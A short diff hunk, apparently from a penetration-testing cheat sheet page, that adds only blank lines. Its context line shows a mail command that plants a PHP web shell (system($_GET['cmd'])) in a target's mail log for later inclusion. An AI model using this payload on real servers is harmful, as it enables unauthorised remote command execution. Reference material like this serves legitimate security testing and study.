@@ -14,3 +14,5 @@ updated_at: '2023-04-10T20:22:15.238045+00:00'
 ```powershell
 mail -s "<?php system($_GET['cmd']);?>" www-data@10.10.10.10. < /dev/null
 ```
+
+
